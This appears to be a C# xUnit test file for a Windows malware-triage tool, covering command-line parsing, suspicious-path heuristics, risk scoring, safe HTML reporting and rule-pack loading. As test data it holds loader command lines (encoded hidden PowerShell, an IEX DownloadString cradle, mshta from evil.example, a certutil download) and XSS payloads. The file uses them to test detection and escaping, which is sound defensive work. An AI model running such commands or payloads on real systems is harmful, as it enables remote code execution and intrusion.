using System.Net;
using System.Text.Json;
using TriageKit.Core.Checks;
using TriageKit.Core.Engine;
using TriageKit.Core.Intel;
using TriageKit.Core.Reporting;
using TriageKit.Core.Rules;
using Xunit;

namespace TriageKit.Tests;

public class CommandLineTests
{
    private static string Id(string s) => s;   // no env expansion in tests

    [Theory]
    [InlineData(@"""C:\Program Files\App\app.exe"" --background", @"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Tools\thing.exe /s", @"C:\Tools\thing.exe")]
    [InlineData(@"C:\Program Files\Some App\run.exe -x", @"C:\Program Files\Some App\run.exe")]
    [InlineData(@"C:\Windows\System32\rundll32.exe C:\Users\Bob\AppData\Roaming\evil.dll,Start", @"C:\Users\Bob\AppData\Roaming\evil.dll")]
    [InlineData(@"""C:\Windows\System32\wscript.exe"" //B ""C:\Users\Bob\AppData\Local\Temp\x.vbs""", @"C:\Users\Bob\AppData\Local\Temp\x.vbs")]
    [InlineData(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -file C:\ProgramData\u.ps1", @"C:\ProgramData\u.ps1")]
    [InlineData(@"\??\C:\Windows\system32\drivers\foo.sys", @"C:\Windows\system32\drivers\foo.sys")]
    public void ExtractsRealTarget(string cmd, string expected) =>
        Assert.Equal(expected, CommandLine.ExtractTarget(cmd, Id));

    [Fact]
    public void ResolvesBareProgramNames() =>
        Assert.Equal(@"C:\Windows\System32\svchost.exe", CommandLine.ExtractTarget("svchost.exe -k netsvcs", Id, n => @"C:\Windows\System32\" + n));

    [Fact]
    public void EmptyIsNull() => Assert.Null(CommandLine.ExtractTarget("  ", Id));

    [Theory]
    [InlineData("powershell -w hidden -enc SQBFAFgA", true)]
    [InlineData("powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"", true)]
    [InlineData("mshta.exe http://evil.example/a.hta", true)]
    [InlineData("cmd.exe /c certutil -urlcache -f http://x/a.exe a.exe", true)]
    [InlineData(@"""C:\Program Files\Brave\brave.exe"" --type=renderer", false)]
    [InlineData("powershell.exe -File C:\\Scripts\\backup.ps1", false)]
    public void FlagsLoaderCommandLines(string cmd, bool suspicious) => Assert.Equal(suspicious, CommandLine.IsSuspiciousScriptHost(cmd));
}

public class PathHeuristicTests
{
    [Theory]
    [InlineData(@"C:\Users\Bob\AppData\Local\Temp\abc\x.exe", true)]
    [InlineData(@"C:\Users\Bob\Downloads\setup.exe", true)]
    [InlineData(@"C:\Users\Public\svc.exe", true)]
    [InlineData(@"C:\ProgramData\update.exe", true)]
    [InlineData(@"C:\Users\Bob\AppData\Roaming\winupd.exe", true)]
    [InlineData(@"C:\Users\Bob\AppData\Local\Discord\app-1.0\Discord.exe", false)]
    [InlineData(@"C:\ProgramData\Battle.net\Agent\Agent.exe", false)]
    [InlineData(@"C:\Program Files\App\app.exe", false)]
    public void SuspiciousFolders(string path, bool expected) => Assert.Equal(expected, PathHeuristics.IsSuspicious(path));

    private static FileIntel F(string path, SignatureStatus s) => new() { Path = path, Exists = true, SignatureStatus = s, Suspicious = PathHeuristics.IsSuspicious(path) };

    [Fact] public void UnsignedInTempIsHigh() => Assert.Equal(Risk.High, PathHeuristics.ExecutableRisk(F(@"C:\Users\B\AppData\Local\Temp\a.exe", SignatureStatus.NotSigned)));
    [Fact] public void UnsignedInUserProfileIsMedium() => Assert.Equal(Risk.Medium, PathHeuristics.ExecutableRisk(F(@"C:\Users\B\AppData\Local\Tool\a.exe", SignatureStatus.NotSigned)));
    [Fact] public void SignedInProgramFilesIsInfo() => Assert.Equal(Risk.Info, PathHeuristics.ExecutableRisk(F(@"C:\Program Files\X\a.exe", SignatureStatus.Valid)));
    [Fact] public void TamperedSignedIsCritical() => Assert.Equal(Risk.Critical, PathHeuristics.ExecutableRisk(F(@"C:\Program Files\X\a.exe", SignatureStatus.HashMismatch)));
    [Fact] public void MissingFileIsLow() => Assert.Equal(Risk.Low, PathHeuristics.ExecutableRisk(new FileIntel { Path = "C:\\x.exe", Exists = false }));
    [Fact] public void MaxPicksMoreSevere() { Assert.Equal(Risk.High, PathHeuristics.Max(Risk.Low, Risk.High)); Assert.Equal(Risk.Critical, PathHeuristics.Max(Risk.Critical, Risk.Medium)); }
}

public class ScoringTests
{
    private static Finding F(Severity s) => new() { Severity = s, Category = "T", Title = "t" };

    [Fact] public void NoFindingsIsClean() => Assert.Equal((100, "Looks clean"), Scoring.Calculate(Array.Empty<Finding>()));
    [Fact] public void CriticalCapsAt25() { var (s, v) = Scoring.Calculate(new[] { F(Severity.Critical) }); Assert.True(s <= 25); Assert.Equal("Likely compromised", v); }
    [Fact] public void HighCapsAt70() { var (s, v) = Scoring.Calculate(new[] { F(Severity.High) }); Assert.Equal(70, s); Assert.Equal("Needs attention", v); }
    [Fact] public void InfoDoesNotReduceScore() => Assert.Equal(100, Scoring.Calculate(Enumerable.Repeat(F(Severity.Info), 50)).Score);
    [Fact] public void RepeatsOfOneRuleCountOnce() => Assert.Equal(84, Scoring.Calculate(Enumerable.Repeat(F(Severity.Medium), 40)).Score);   // 95 by points, but a Medium is never "Looks clean"
    [Fact] public void ManyDistinctMediumsAreCapped() => Assert.Equal(70, Scoring.Calculate(Enumerable.Range(0, 40).Select(i => new Finding { Severity = Severity.Medium, Category = "x", Title = "t" + i, Detail = "", Recommendation = "", RuleId = "r" + i })).Score);
    [Fact] public void ScoreNeverNegative() => Assert.True(Scoring.Calculate(Enumerable.Range(0, 50).Select(i => new Finding { Severity = (Severity)(i % 4), Category = "x", Title = "t" + i, Detail = "", Recommendation = "", RuleId = "r" + i })).Score >= 0);
    [Fact] public void HighlightsFoldRepeats()
    {
        var fs = Enumerable.Range(0, 7).Select(i => new Finding { Severity = Severity.Medium, Category = "Browser", Title = "Add-on " + i, Detail = "", Recommendation = "", RuleId = "browser.x" })
                 .Append(new Finding { Severity = Severity.High, Category = "System", Title = "UAC off", Detail = "", Recommendation = "", RuleId = "system.uac" }).ToList();
        var h = Highlights.Build(fs);
        Assert.Equal(2, h.Count);
        Assert.Equal("UAC off", h[0].Title);
        Assert.Equal(7, h[1].Count);
        Assert.Contains("+6 similar", h[1].Title);
    }
}

public class ReportTests
{
    [Fact]
    public void UntrustedStringsCannotBreakOutOfScriptTag()
    {
        var result = new ScanResult { Meta = new ScanMeta { ComputerName = "PC" } };
        result.Findings.Add(new Finding { Severity = Severity.Medium, Category = "Browser", Title = "</script><script>alert(1)</script>" });
        result.Data["x"] = new { Name = "<img src=x onerror=alert(2)>", Sep = "a" + (char)0x2028 + "b" };
        var json = ReportWriter.ToJson(result);
        var html = ReportWriter.ToHtml(json, "<html><script>const DATA = \"__TRIAGE_DATA__\";</script></html>");
        Assert.Equal(1, CountOf(html, "<script>"));
        Assert.Equal(1, CountOf(html, "</script>"));
        Assert.DoesNotContain("<img", html);
        Assert.DoesNotContain(((char)0x2028).ToString(), html);
    }

    [Fact]
    public void EmbeddedTemplateHasMarker() => Assert.Contains("\"__TRIAGE_DATA__\"", ReportWriter.LoadTemplate());

    [Fact]
    public void JsonUsesStringEnumsAndPascalCase()
    {
        var r = new ScanResult { Meta = new ScanMeta() };
        r.Findings.Add(new Finding { Severity = Severity.High, Category = "C", Title = "T", Mitre = "T1547.001" });
        using var doc = JsonDocument.Parse(ReportWriter.ToJson(r));
        var f = doc.RootElement.GetProperty("Findings")[0];
        Assert.Equal("High", f.GetProperty("Severity").GetString());
        Assert.Equal("T1547.001", f.GetProperty("Mitre").GetString());
    }

    [Fact]
    public void WriteProducesManifestCoveringOutputs()
    {
        var dir = Path.Combine(Path.GetTempPath(), "tk-test-" + Guid.NewGuid());
        try
        {
            ReportWriter.Write(new ScanResult { Meta = new ScanMeta() }, dir);
            var manifest = File.ReadAllLines(Path.Combine(dir, "manifest.sha256"));
            Assert.Contains(manifest, l => l.EndsWith("  report.html"));
            Assert.Contains(manifest, l => l.EndsWith("  results.json"));
            var line = manifest.Single(l => l.EndsWith("results.json"));
            Assert.Equal(FileIntelService.Sha256(Path.Combine(dir, "results.json")), line.Split("  ")[0]);
        }
        finally { Directory.Delete(dir, true); }
    }

    private static int CountOf(string s, string sub) { int c = 0, i = 0; while ((i = s.IndexOf(sub, i, StringComparison.Ordinal)) >= 0) { c++; i += sub.Length; } return c; }
}

public class RulePackTests
{
    [Fact]
    public void BuiltInPackLoadsAndCompiles()
    {
        var ind = Indicators.LoadBuiltIn();
        Assert.NotEmpty(ind.RatPorts);
        Assert.Contains("svchost.exe", ind.SystemProcessLocations.Keys);
        Assert.Contains(ind.RemoteAccessTools, t => t.Name == "AnyDesk");
        // Every pattern must be a valid regex - a broken rule pack must fail CI, not a customer's scan.
        foreach (var p in ind.MinerProcessPatterns.Concat(ind.DualUseToolPatterns).Concat(ind.HostsSensitiveDomains)
                     .Concat(ind.SuspiciousPowerShellPatterns).Concat(ind.BrowserStoreUpdateUrls)
                     .Concat(ind.RemoteAccessTools.SelectMany(t => new[] { t.Pattern, t.Process })))
            _ = new System.Text.RegularExpressions.Regex(p);
    }

    [Fact]
    public void InvalidExternalPackFallsBackToBuiltIn()
    {
        var path = Path.GetTempFileName();
        File.WriteAllText(path, "{ not json");
        try { Assert.Equal(Indicators.LoadBuiltIn().Version, Indicators.Load(path).Version); }
        finally { File.Delete(path); }
    }

    [Theory]
    [InlineData("Trojan:Win32/Wacatac.B!ml", true)]
    [InlineData("Trojan:Win32/Etset!rfn", true)]
    [InlineData("Backdoor:MSIL/AsyncRat.AD", false)]
    public void GenericDetectionSuffixes(string name, bool generic) =>
        Assert.Equal(generic, Indicators.LoadBuiltIn().GenericDetectionSuffixes.Any(s => name.EndsWith(s, StringComparison.OrdinalIgnoreCase)));
}

public class CsvAndDateTests
{
    [Fact]
    public void ParsesQuotedCsv()
    {
        var rows = Csv.Parse("A,B,C\r\n\"x, y\",\"he said \"\"hi\"\"\",z\r\n\"multi\nline\",2,3\n");
        Assert.Equal(3, rows.Count);
        Assert.Equal("x, y", rows[1][0]);
        Assert.Equal("he said \"hi\"", rows[1][1]);
        Assert.Equal("multi\nline", rows[2][0]);
    }

    [Theory]
    [InlineData("11/12/2026", 2026, 11, 12)]
    [InlineData("20261112", 2026, 11, 12)]
    public void ParsesHotfixDates(string s, int y, int m, int d)
    {
        var dt = SystemPostureCheck.ParseHotfixDate(s);
        Assert.NotNull(dt);
        Assert.Equal(new DateTime(y, m, d), dt!.Value.Date);
    }
}

